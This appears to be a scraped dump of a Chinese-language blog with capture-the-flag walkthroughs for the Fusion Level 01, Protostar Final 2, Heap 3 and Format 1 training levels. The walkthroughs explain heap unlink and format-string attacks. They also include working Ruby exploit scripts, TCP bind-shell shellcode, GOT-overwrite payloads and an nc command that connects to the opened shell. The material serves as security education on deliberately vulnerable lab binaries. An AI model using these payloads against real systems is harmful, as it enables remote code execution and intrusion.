#jmp_real_shellcode = \u0026#34;\\xCC\\xCC\\xCC\\xCC\u0026#34; * 10 jmp_real_shellcode = \u0026#34;\\x90\\x90\u0026#34; + \u0026#34;\\x81\\xc4\\x10\\x10\\x10\\x10\\x81\\xec\\x30\\x0f\\x10\\x10\\xff\\xe4\u0026#34; + \u0026#34;\\xCC\u0026#34; * (40 - 16) # tcpbindshell (108 bytes) # http://shell-storm.org/shellcode/files/shellcode-847.php PORTHL = \u0026#34;\\x7a\\x69\u0026#34; # default is \\x7a\\x69 = 31337 shellcode = \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68\u0026#34; + PORTHL + \u0026#34;\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a\\x01\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x31\\xc0\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026#34; payload = request + padding + return_addr + jmp_real_shellcode + protocol + nop + shellcode puts \u0026#34;\u0026gt; payload: \u0026#34; + payload.inspect socket.puts payload command = \u0026#34;nc -v #{hostname} 31337\u0026#34; puts \u0026#34;\u0026gt; when you want to exit the shell, use `Ctrl+C` instead of `exit`\u0026#34; puts \u0026#34;\u0026gt; #{command}\u0026#34; system command socket.close ","date":"2022-04-27T00:00:00Z","image":"/p/fusion_level_01/cover_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_120x120_fill_box_smart1_3.png","permalink":"/p/fusion_level_01/","title":"Fusion Level 01 Walkthrough"},{"content":"☞ 最终的 Ruby 脚本放在了这里\n至此 Protostar 全部做完了呢\u0026hellip;\nFinal Two ☞ Protostar Final Two\nRemote heap level :)\nCore files will be in /tmp.\nThis level is at /opt/protostar/bin/final2\n#include \u0026#34;../common/common.c\u0026#34; #include \u0026#34;../common/malloc.c\u0026#34; #define NAME \u0026#34;final2\u0026#34; #define UID 0 #define GID 0 #define PORT 2993 #define REQSZ 128 void check_path(char *buf) { char *start; char *p; int l; /* * Work out old software bug */ p = rindex(buf, \u0026#39;/\u0026#39;); l = strlen(p); if(p) { start = strstr(buf, \u0026#34;ROOT\u0026#34;); if(start) { while(*start != \u0026#39;/\u0026#39;) start--; memmove(start, p, l); printf(\u0026#34;moving from %p to %p (exploit: %s / %d)\\n\u0026#34;, p, start, start \u0026lt; buf ? \u0026#34;yes\u0026#34; : \u0026#34;no\u0026#34;, start - buf); } } } int get_requests(int fd) { char *buf; char *destroylist[256]; int dll; int i; dll = 0; while(1) { if(dll \u0026gt;= 255) break; buf = calloc(REQSZ, 1); if(read(fd, buf, REQSZ) != REQSZ) break; if(strncmp(buf, \u0026#34;FSRD\u0026#34;, 4) != 0) break; check_path(buf + 4); dll++; } for(i = 0; i \u0026lt; dll; i++) { write(fd, \u0026#34;Process OK\\n\u0026#34;, strlen(\u0026#34;Process OK\\n\u0026#34;)); free(destroylist[i]); } } int main(int argc, char **argv, char **envp) { int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); get_requests(fd); } 首先很奇怪的\u0026hellip;.在 int get_requests(int fd) 中，出现了 free(destroylist[i]);，但是 destroylist[] 到底存了什么东西，并没有任何地方提到\u0026hellip;.\n因为给的源码和 gdb 二进制文件出来的东西不一样\u0026hellip;\n谢谢，有被坑到x\n这里记一些 Radare2 的基本用法\u0026hellip;\nanalyze all: aa\nseek to function: s sym.get_requests\nenter visual mode: V\nshow function disassembly: pdf\nrename variable: afvn your_name var_xxxxh\n虽然我记了，但我还是用了 gdb x\n(gdb) set disassembly-flavor intel (gdb) disassemble get_requests Dump of assembler code for function get_requests: 0x0804bd47 \u0026lt;get_requests+0\u0026gt;:\tpush ebp 0x0804bd48 \u0026lt;get_requests+1\u0026gt;:\tmov ebp,esp 0x0804bd4a \u0026lt;get_requests+3\u0026gt;:\tsub esp,0x428 0x0804bd50 \u0026lt;get_requests+9\u0026gt;:\tmov DWORD PTR [ebp-0x10],0x0 0x0804bd57 \u0026lt;get_requests+16\u0026gt;:\tcmp DWORD PTR [ebp-0x10],0xfe 0x0804bd5e \u0026lt;get_requests+23\u0026gt;:\tjg 0x804bddb \u0026lt;get_requests+148\u0026gt; 0x0804bd60 \u0026lt;get_requests+25\u0026gt;:\tmov DWORD PTR [esp+0x4],0x1 0x0804bd68 \u0026lt;get_requests+33\u0026gt;:\tmov DWORD PTR [esp],0x80 0x0804bd6f \u0026lt;get_requests+40\u0026gt;:\tcall 0x804b4ee \u0026lt;calloc\u0026gt; 0x0804bd74 \u0026lt;get_requests+45\u0026gt;:\tmov DWORD PTR [ebp-0x14],eax 0x0804bd77 \u0026lt;get_requests+48\u0026gt;:\tmov eax,DWORD PTR [ebp-0x10] 0x0804bd7a \u0026lt;get_requests+51\u0026gt;:\tmov edx,DWORD PTR [ebp-0x14] 0x0804bd7d \u0026lt;get_requests+54\u0026gt;:\tmov DWORD PTR [ebp+eax*4-0x414],edx ...... 对比一下源码的话可以推断出：\n\u0026lt;get_requests+9\u0026gt;:\tmov DWORD PTR [ebp-0x10],0x0 而源码中出现：dll = 0 所以 ebp-0x10 = dll \u0026lt;get_requests+25\u0026gt;:\tmov DWORD PTR [esp+0x4],0x1 \u0026lt;get_requests+33\u0026gt;:\tmov DWORD PTR [esp],0x80\t//--\u0026gt; 0x80 = 128 = REQSZ \u0026lt;get_requests+40\u0026gt;:\tcall 0x804b4ee \u0026lt;calloc\u0026gt; \u0026lt;get_requests+45\u0026gt;:\tmov DWORD PTR [ebp-0x14],eax 调用约定一般把 call 的返回值放到 eax 里， 而源代码中出现：buf = calloc(REQSZ, 1); 所以 ebp-0x14 = buf \u0026lt;get_requests+40\u0026gt;:\tcall 0x804b4ee \u0026lt;calloc\u0026gt; \u0026lt;get_requests+45\u0026gt;:\tmov DWORD PTR [ebp-0x14],eax\t//--\u0026gt; buf = eax = \u0026lt;calloc\u0026gt;\u0026#39;s return \u0026lt;get_requests+48\u0026gt;:\tmov eax,DWORD PTR [ebp-0x10]\t//--\u0026gt; eax = dll \u0026lt;get_requests+51\u0026gt;:\tmov edx,DWORD PTR [ebp-0x14]\t//--\u0026gt; edx = buf \u0026lt;get_requests+54\u0026gt;:\tmov DWORD PTR [ebp+eax*4-0x414],edx //--\u0026gt; [ebp + eax*4 - 0x414] = edx //--\u0026gt; [ebp - 0x414 + eax*4] = edx //--\u0026gt; [ebp - 0x414 + dll*4] = buf ebp - 0x414 看起来像是某个起始值...再加上 dll*4 (int 数组一个值 4bytes) 所以大概可以推断出源码是这样： destroylist[dll] = buf; 即： dll = 0; while(1) { if(dll \u0026gt;= 255) break; buf = calloc(REQSZ, 1); destroylist[dll] = buf; //\u0026lt;--就是这玩意，题目给的源码里根本没写 if(read(fd, buf, REQSZ) != REQSZ) break; ....... 另外，void check_path(char *buf) 里的那句 printf 也并没在汇编代码中出现\u0026hellip;\nVulnerability 这道题的关键在于 void check_path(char *buf) 中的\np = rindex(buf, \u0026#39;/\u0026#39;); l = strlen(p); if(p) { start = strstr(buf, \u0026#34;ROOT\u0026#34;); if(start) { while(*start != \u0026#39;/\u0026#39;) start--; memmove(start, p, l); printf(\u0026#34;moving from %p to %p (exploit: %s / %d)\\n\u0026#34;, p, start, start \u0026lt; buf ? \u0026#34;yes\u0026#34; : \u0026#34;no\u0026#34;, start - buf); } } 程序的预期（只是举例）：\nbuf = \u0026#34;abcd/adcdROOT\u0026#34; ↑p = rindex(buf, \u0026#39;/\u0026#39;) p = \u0026#34;/adcdROOT\u0026#34; l = strlen(p) = 9 buf = \u0026#34;abcd/adcdROOT\u0026#34; ↑ ↑start ↑while(*start != \u0026#39;/\u0026#39;) start--; memmove(start, p, l) 也就是 ROOT 出现在 / 后面\u0026hellip;但如果出现在了前面的话..?\nbuf = \u0026#34;abcdROOTadcd/\u0026#34; ↑p = rindex(buf, \u0026#39;/\u0026#39;) p = \u0026#34;/\u0026#34; l = strlen(p) = 1 buf = \u0026#34;abcdROOTadcd/\u0026#34; ↑start ←while(*start != \u0026#39;/\u0026#39;) start--; 减到不知道哪里去了x memmove(start, p, l) 到这个地方我们大概就可以知道，可以利用这一点把 start 移动到当前栈帧向前的任意 /处，memmove(start, p, l)\n然后再利用 int get_requests(int fd) 的 free(destroylist[i])！\n这就是那个 unlink() 的 trick 了，\n关于 dlmalloc 的 unlink trick，全部已经移动到了这里：Old Dlmalloc Unlink Tricks\n请看完那篇后再继续向下看\nRestriction int get_requests(int fd) 中有两句很讨厌的话：\ndll = 0; while(1) { if(dll \u0026gt;= 255) break; buf = calloc(REQSZ, 1); destroylist[dll] = buf; //就是这两句 if(read(fd, buf, REQSZ) != REQSZ) break; if(strncmp(buf, \u0026#34;FSRD\u0026#34;, 4) != 0) break; check_path(buf + 4); dll++; } 所以我们输入的字符串：\n必须得有 REQSZ = 128 bytes 个字符，否则 break 必须以 FSRD 开头，否则 break 以上两点不满足的话不会执行 check_path(buf + 4) 也就不会执行里面的那句 memmove(start, p, l)；也不会 buf++ 然后被 free()\nUnlink 接下来就可以考虑一下 unlink() 了，\n这道题的顺序是：\n创建 chunkA 创建 chunkB 释放 chunkA 释放 chunkB 那么很明显，chunkA 先于 chunkB 释放，这是一道「向后 unlink()」题\n必须满足的条件：\n不是 fastbin（已满足）\n不是通过 mmap 分配（已满足）\naChunk 的 相邻下一个 chunk 并不是最后堆中的最后一个 且，aChunk 的 相邻下一个 chunk 的 再相邻下一个 chunk 的 PREV_INUSE 为否 (也就相当于 aChunk 的 相邻下一个 chunk 不在被使用)\n=\u0026gt; 会对 aChunk 的 相邻下一个 chunk 执行 unlink()\n由于 REQSZ 设定为 128，大于 80 所以不会使用 fastbin\n由于先释放的是 chunkA，那么就利用到了 Trick: use negative size 中的 next chunk’s next’s PREV_INUSE 章节\n建议先看完再继续\n直接说结论的话，我们只要把 chunkB 的 size 覆盖为 0xfffffffc = -0x4 就能满足第三个条件\n另外，prev_size 也会被覆盖，为了区分就使用 0xfffffff8 = -0x8 好了\n可以开始考虑一下 P-\u0026gt;fd 和 P-\u0026gt;bk 要写什么了\n比如把某个可怜的函数指向动态链接表里的值指向堆上的某段 shellcode\u0026hellip;这道题里似乎只能选择这个 write()\nint get_requests(int fd) { ...... for(i = 0; i \u0026lt; dll; i++) { write(fd, \u0026#34;Process OK\\n\u0026#34;, strlen(\u0026#34;Process OK\\n\u0026#34;)); free(destroylist[i]); } } 如果我们弄出两个堆帧，那么执行顺序是：\nwrite() free(chunkA) write() free(chunkB) 在 2. free(chunkA) 的时候我们就已经通过 unlink 覆写了 write 指向的地址 那么在 4. free(chunkB) 之前 shellcode 就已经执行了\nuser@protostar:~$ objdump -R /opt/protostar/bin/final2 | grep write 0804d41c R_386_JUMP_SLOT write 0804d468 R_386_JUMP_SLOT fwrite user@protostar:~$ 套用 Vulnerability: unlink 中的公式：\n令 fd = addr of write - 0xc fd = 令 bk = addr of shllcode 那么 我们所想要的： fd + 0xc = addr of shllcode 我们必须得纳入考虑并避免的： bk + 0x8 = addr of func 第一个堆帧在 gdb 里看起来是这样的：\n(gdb) x/40x 0x804e000 0x804e000:\t0x00000000\t0x00000089\t0x44525346\t0x41414141 0x804e010:\t0x42424242\t0x43434343\t0x44444444\t0x45454545 4142434445 只是一堆随便的字符，先不管它\n0x804e008: 44525346: 就是开头说过的「必须以 FSRD 开头，否则 break」 同时这里也是 buffer 开始的位置 (mem) 和 addr of shellcode\n0x804e010: 0x42424242: 这里相当于就是 addr of shellcode+0x8，前文提到过这里会被 unlink() 写上 addr of write()\n所以 shellcode 实际是从 0x804e014: 0x43434343 开始\n即\n(gdb) x/40x 0x804e000 write 指向了这里↓ 0x804e000: [00000000] | [00000089] | [F S R D] | [NOPNOPNOP] 0x804e010: [NOPNOPNOP]| [Shellcode....................... ↑这里会被写上 `addr of write()` 这里有点点问题\n毕竟，虽然写上了 NOP，但 0x804e010 处的 addr of write 的地址也确实会被当作一些指令\n这次运气倒是比较好，因为这个指令翻译过去的话是：\n# x86 (32), Little Endian 1cd40408 # Disassembly 0x0000000000000000: 1C D4 sbb al, 0xd4 0x0000000000000002: 04 08 add al, 8 看起来还算正常，并不会导致 Illegal instruction\nExpection 结合前面提到过的，本题关键在于，程序的预期是 ROOT 出现在 / 后面\n但如果出现在了前面的话，start 就会一直向前移动直到遇到上一个 /\u0026hellip;.然后 memmove(start, p, l)\nvoid *memmove(void *dest, const void *src, size_t n): The memmove() function copies n bytes from memory area src to memory area dest.\n我们想让 chunkB 的 prev_size 和 size 分别等于 -8 和 -4\n那么0xfffffff8 和 0x0xfffffffc 都是 4 bytes 即:\nl = 8 p = \u0026ldquo;\\xf8\\xff\\xff\\xff\u0026rdquo; + \u0026ldquo;\\xfc\\xff\\xff\\xff\u0026rdquo; start 指向 prev_size 之前 也就是：\n# zzzz is padding # prsz = chunkB.prev_size # size = chunkB.size ← chunk A|chunk B → -8| -4| fd| bk ....|zzz/|prsz|size|FSRD|zzzz|....|ROOT|zzz/|====|====|====|==== ↑ ↑ ↑p = rindex(buf, \u0026#39;/\u0026#39;) ↑ ↑ ↑l = strlen(p) = 9 ↑ ↑start = (buf, \u0026#34;ROOT\u0026#34;); ↑while(*start != \u0026#39;/\u0026#39;) {start--;} ↑start ↓ memmove(start, p, l) ↓ ← chunk A|chunk B → ....|zzz/|prsz|size|FSRD|zzzz|....|ROOT|zzz/|fff8|fffc /|====|====|====|==== -8| -4| fd| bk Implement 最终的思路画成图：\n直接写成脚本吧\n#!/usr/bin/ruby require \u0026#39;socket\u0026#39; puts \u0026#34;\u0026gt; Enter hostname:\u0026#34; hostname = gets.chomp port = 2993 socket = TCPSocket.open(hostname, port) # tcpbindshell (108 bytes) # http://shell-storm.org/shellcode/files/shellcode-847.php PORTHL = \u0026#34;\\x7a\\x69\u0026#34; # default is \\x7a\\x69 = 31337 shellcode = \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68\u0026#34; + PORTHL + \u0026#34;\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a\\x01\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x31\\xc0\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026#34; # 0xfffffff8 = -8 # 0xfffffffc = -4 # 0x0804d41c = write_address # 0x0804e014 = shellcode_address #chunkMetadata = [0xfffffff8].pack(\u0026#34;I\u0026#34;) + [0xfffffffc].pack(\u0026#34;I\u0026#34;) + [0x0804d41c-0xc].pack(\u0026#34;I\u0026#34;) + [0x0804e014].pack(\u0026#34;I\u0026#34;) chunkMetadata = \u0026#34;\\xf8\\xff\\xff\\xff\u0026#34; + \u0026#34;\\xfc\\xff\\xff\\xff\u0026#34; + \u0026#34;\\x10\\xd4\\x04\\x08\u0026#34; + \u0026#34;\\x08\\xe0\\x04\\x08\u0026#34; chunkA = \u0026#34;FSRD\u0026#34; + \u0026#34;\\x90\u0026#34; * 8 + shellcode + \u0026#34;\\x90\u0026#34; * (128 - 4 - 8 - shellcode.bytesize - 1) + \u0026#34;/\u0026#34; chunkB = \u0026#34;FSRD\u0026#34; + \u0026#34;z\u0026#34; * (128 - 4 - 8 - chunkMetadata.bytesize) + \u0026#34;ROOTzzz/\u0026#34; + chunkMetadata puts chunkA.inspect puts chunkB.inspect socket.puts chunkA + chunkB system(\u0026#34;nc -v 192.168.215.129 31337\u0026#34;) socket.close Appendix buf.png (using draw.io)\n","date":"2022-04-18T00:00:00Z","image":"/p/protostar_final_2/cover_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_120x120_fill_box_smart1_3.png","permalink":"/p/protostar_final_2/","title":"Protostar Final 2 Walkthrough"},{"content":"☞ 最终的 Ruby 脚本放在了这里\nReferences Once upon a free()\u0026hellip;\nold malloc implementations\nProtostar Heap3 Walkthrough | conceptofproof\nThe Heap: dlmalloc unlink() exploit - bin 0x18\nHeap Three This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.\nThis level is at /opt/protostar/bin/heap3\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void winner() { printf(\u0026#34;that wasn\u0026#39;t too bad now, was it? @ %d\\n\u0026#34;, time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(\u0026#34;dynamite failed?\\n\u0026#34;); } Before unlink() 我们的目标是把 puts() 在动态链接表中记录的地址，写上能跳转到 winner() 的 shellcode\n而能帮我们达到以上目的的函数就是 free()， 准确来说是 unlink()\n关于 dlmalloc 的 unlink trick，全部已经移动到了这里：Old Dlmalloc Unlink Tricks\n如果你看完了那篇，那么再结合一下这道题目，\nheap3 首先依次创建了 chunkA, chunkB, chunkC 然后再反过来依次释放 chunkC, chunkB, chunkA\n所以这道题是「向前 unlink()」\n需要满足的条件：\n不是 fastbin\n不是通过 mmap 分配（已满足）\nChunk 的 PREV_INUSE 被标记为否\n=\u0026gt; 会对 Chunk 的 相邻上一个 chunk 执行 unlink()\n由于题目中的 malloc() 大小是 32，小于 80 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 Trick: use negative size 章节，使用一个负数：0xfffffffc\n那么将 size 设置为 0xfffffffc = -4 就可以满足第一个条件\n但是，如果我们是使用 BufferOverFlow 的方式，从 chunkA 开始去覆写 chunkB 的 size 的话，会导致 prev_size 也被覆盖上，\n而且，既然是「向前 unlink()」，那么 malloc 计算上一个 chunk 的方式是 p - prev_size；如果 prev_size 是乱七八糟的数值，必定会导致 Segmentation fault\n这时候可以再用一次负数，为了区分，就使用 0xfffffff8 = -8 好了：而这样做的效果是，p - prev_size = p - -8 = p + 8\n也就是说，p 的 prevchunk 出现在了 p 的向后 0x8 的位置：\n至此，我们成功伪造了 chunkB 的 prevchunk，\n而这个 prevchunk 的 fd 的位置是 p - prev_size + 0x8\n也就是 p 向后偏移 0x10 的位置\n而 bk 的话再偏移 0x4 也就是 p + 0x14\nCreate a fake chunk 首先，我们所需要的地址有两个：puts() 在 GOT 上的地址 和 指向 winner() shellcode 的地址\nroot@protostar:/tmp# objdump -R /opt/protostar/bin/heap3 | grep puts 0804b128 R_386_JUMP_SLOT puts root@protostar:/tmp# objdump -t /opt/protostar/bin/heap3 | grep winner 08048864 g F .text\t00000025 winner 我们可以把 push 0x08048864 ret 写在 chunkA 的开头，那么地址就是（这里我当然是用了 gdb proc map 看堆到底在哪里的）就是 0x804c008\n那么使用前面的公式：\n令 fd = addr of func - 0xc 令 bk = addr of shllcode 那么 我们所想要的： fd + 0xc = addr of shllcode 我们必须得纳入考虑并避免的： bk + 0x8 = addr of func 换成这道题的地址：\n令 fd = addr of func - 0xc =\u0026gt; fd = addr of puts - 0xc = 0x0804b11c 令 bk = addr of shllcode =\u0026gt; bk = 0x804c008 那么 我们所想要的： fd + 0xc = addr of shllcode 我们必须得纳入考虑并避免的： bk + 0x8 = addr of puts 关于制作 shellcode，可以使用这个工具\n# x86 (32), Little Endian # 0x08048864 is the address of winner push 0x08048864 ret # Assembly - Little Endian \u0026#34;\\x68\\x64\\x88\\x04\\x08\\xc3\u0026#34; 然后，直接可以画出这张图了：\nFree a fastbin 其实已经基本解完了\u0026hellip;但其实还有最后一个小问题\n我们先用上一节的那张图片的思路来试一下吧（第三个参数完全不需要，所以随便写一个 ABCD 就行）\nuser@protostar:/tmp$ ruby -e \u0026#39;puts \u0026#34;\\x68\\x64\\x88\\x04\\x08\\xc3\u0026#34; + \u0026#34;A\u0026#34;*26 + \u0026#34;\\xf8\\xff\\xff\\xff\u0026#34; + \u0026#34;\\xfc\\xff\\xff\\xff\u0026#34; \u0026#39; \u0026gt; A user@protostar:/tmp$ ruby -e \u0026#39;puts \u0026#34;\\xef\\xbe\\xad\\xde\u0026#34;*2 + \u0026#34;\\x1c\\xb1\\x04\\x08\u0026#34; + \u0026#34;\\x08\\xc0\\x04\\x08\u0026#34; \u0026#39; \u0026gt; B (gdb) r `cat /tmp/A` `cat /tmp/B` ABCD 太长不看，直接进入正题，从 Heap Three 的三个 free() 开始吧\n设置四个断点，分别是第一个 free() 前和每个 free() 后\n直接看结果的话\u0026hellip;\n(gdb) r `cat /tmp/A` `cat /tmp/B` ABCD Starting program: /opt/protostar/bin/heap3 `cat /tmp/A` `cat /tmp/B` ABCD # free(c) 之前 0x804c000:\t0x00000000\t0x00000029\t0x04886468\t0x4141c308 0x804c010:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0x804c020:\t0x41414141\t0x41414141\t0xfffffff8\t0xfffffffc 0x804c030:\t0xdeadbeef\t0xdeadbeef\t0x0804b11c\t0x0804c008 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000029\t0x44434241\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000 Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff804) at heap3/heap3.c:24 24\tin heap3/heap3.c # free(c) 之后 (gdb) c Continuing. 0x804c000:\t0x00000000\t0x00000029\t0x04886468\t0x4141c308 0x804c010:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0x804c020:\t0x41414141\t0x41414141\t0xfffffff8\t0xfffffffc 0x804c030:\t0xdeadbeef\t0xdeadbeef\t0x0804b11c\t0x0804c008 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000029\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000 Breakpoint 2, main (argc=4, argv=0xbffff804) at heap3/heap3.c:25 25\tin heap3/heap3.c # free(b) 之后 (gdb) Continuing. 0x804c000:\t0x00000000\t0x00000029\t0x04886468\t0x4141c308 0x804c010:\t0x0804b11c\t0x41414141\t0x41414141\t0x41414141 0x804c020:\t0x41414141\t0xfffffff4\t0xfffffff8\t0xfffffffc 0x804c030:\t0xdeadbeef\t0xfffffff5\t0x0804b194\t0x0804b194 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000fb1\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000 Breakpoint 3, main (argc=4, argv=0xbffff804) at heap3/heap3.c:26 26\tin heap3/heap3.c # free(a) 之后 (gdb) Continuing. 0x804c000:\t0x00000000\t0x00000029\t0x00000000\t0x4141c308 0x804c010:\t0x0804b11c\t0x41414141\t0x41414141\t0x41414141 0x804c020:\t0x41414141\t0xfffffff4\t0xfffffff8\t0xfffffffc 0x804c030:\t0xdeadbeef\t0xfffffff5\t0x0804b194\t0x0804b194 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000fb1\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000 Breakpoint 4, main (argc=4, argv=0xbffff804) at heap3/heap3.c:28 28\tin heap3/heap3.c # 出现了 Segmentation fault (gdb) Continuing. Program received signal SIGSEGV, Segmentation fault. 0x804c000:\t0x00000000\t0x00000029\t0x00000000\t0x4141c308 0x804c010:\t0x0804b11c\t0x41414141\t0x41414141\t0x41414141 0x804c020:\t0x41414141\t0xfffffff4\t0xfffffff8\t0xfffffffc 0x804c030:\t0xdeadbeef\t0xfffffff5\t0x0804b194\t0x0804b194 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000fb1\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000 0x0804c024 in ?? () (gdb) Continuing. Program terminated with signal SIGSEGV, Segmentation fault. The program no longer exists. 0x804c000:\tError while running hook_stop: Cannot access memory at address 0x804c000 (gdb) 可能已经看出来了，对于 chunk A 和 chunk C，这两个 chunk 的 metadata 中的 size 是 0x29，即十进制 41（这里多出来的 1 就是用于标记前一个 chunk 是否被使用的 1 比特）\n所以 size 小于生成双向链表的 80 bytes\u0026hellip;于是用的是 fastbin 数据结构\n结果在 free(c) 和 free(a) 的时候，mem的位置直接被清零了（见 0x804c008 和 0x804c058）\n结果 0x804c008 处写的 shellcode 被清掉了..\n另外，0x804c010 也被写上了奇怪的东西\u0026hellip;也就是\n我们必须得纳入考虑并避免的： bk + 0x8 = addr of puts\n这时候就又要请出 NOP 了\u0026hellip;我们直接把 0x804c008 到 0x804c010 全写上 NOP 就好了\u0026hellip;\n实际上，我觉得我这里做的有点点问题\n毕竟，虽然写上了 NOP，但 0x804c010 处的 addr of puts 的地址也确实会被当作一些指令\n这次运气倒是比较好，因为这个指令翻译过去的话是：\n# x86 (32), Little Endian 1cb10408 # Disassembly 0x0000000000000000: 1C B1 sbb al, 0xb1 0x0000000000000002: 04 08 add al, 8 看起来还算正常，并不会导致 Illegal instruction\n但下次果然还是应该多考虑一下\n那么重新画一下图，就是这样：\nEnd user@protostar:/tmp$ ruby -e \u0026#39;puts \u0026#34;\\x90\u0026#34;*12 + \u0026#34;\\x68\\x64\\x88\\x04\\x08\\xc3\u0026#34; + \u0026#34;A\u0026#34;*14 + \u0026#34;\\xf8\\xff\\xff\\xff\u0026#34; + \u0026#34;\\xfc\\xff\\xff\\xff\u0026#34; \u0026#39; \u0026gt; A user@protostar:/tmp$ ruby -e \u0026#39;puts \u0026#34;\\xef\\xbe\\xad\\xde\u0026#34;*2 + \u0026#34;\\x1c\\xb1\\x04\\x08\u0026#34; + \u0026#34;\\x08\\xc0\\x04\\x08\u0026#34; \u0026#39; \u0026gt; B user@protostar:/tmp$ /opt/protostar/bin/heap3 `cat /tmp/A` `cat /tmp/B` ABCD that wasn\u0026#39;t too bad now, was it? @ 1648020034 user@protostar:/tmp$ 最后附上 Senri 一开始为了方便理解画的图\u0026hellip;实际上并没有方便理解太多\n大概只是觉得 draw.io 这个网站画图很好玩\n然后就很精确地把第一张图的每个小格子都对应到了 byte 大小x\n结果只是浪费了很多时间罢了\n不过可能对你会有帮助\u0026hellip;?\n顺带一提如果这张图遇到了没法向下滑动的问题\u0026hellip;这时候请尽量在图片以外滑动x\n","date":"2022-04-07T00:00:00Z","image":"/p/protostar_heap_3/cover_hucb530b82e8db4d6865287e2d39448560_744108_120x120_fill_box_smart1_3.png","permalink":"/p/protostar_heap_3/","title":"Protostar Heap 3 Walkthrough"},{"content":"☞ 最终的 Ruby 脚本放在了这里\nFormat One ☞ Protostar Format One\nThis level shows how format strings can be used to modify arbitrary memory locations.\nHints\nobjdump -t is your friend, and your input string lies far up the stack :) This level is at /opt/protostar/bin/format1\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int target; void vuln(char *string) { printf(string); if(target) { printf(\u0026#34;you have modified the target :)\\n\u0026#34;); } } int main(int argc, char **argv) { vuln(argv[1]); } Argv[1], %p, Breadcrumb 乍一看，感觉好简单x\nint main(int argc, char **argv) 这里用了指针\n那么思路就是打印一个面包屑做标记比如 ABCD 和一堆 %p 直到输出里出现 44434241 时，说明这里开始就是我们输入的 argv[1] 了\n为什么要叫「面包屑」？参考《糖果屋》\n另外，查看 man 3 printf 的话可以看到：\n%p: The void * pointer argument is printed in hexadecimal (as if by %#x or %#lx).\n所以 %p 和 %08x 效果几乎是一样的，只是 %08x 会在位数不足时开头补上 0，但不会像 %p 那样在每个数字开头补上 \u0026ldquo;0x\u0026rdquo;\n比如，在 %08x 里看起来是这样的值：00000021\n在 %p 里看起来会是这样：0x21\n另外，在 %08x 里看起来是这样的值：00000000\n在 %p 里看起来会是这样：(nil)，也就是 NULL 的意思\n那么开始尝试吧\u0026hellip;使用 ruby -e\nuser@protostar:/tmp$ /opt/protostar/bin/format1 `ruby -e \u0026#39;puts \u0026#34;ABCD\u0026#34; + \u0026#34;|%p\u0026#34;*131 \u0026#39;` 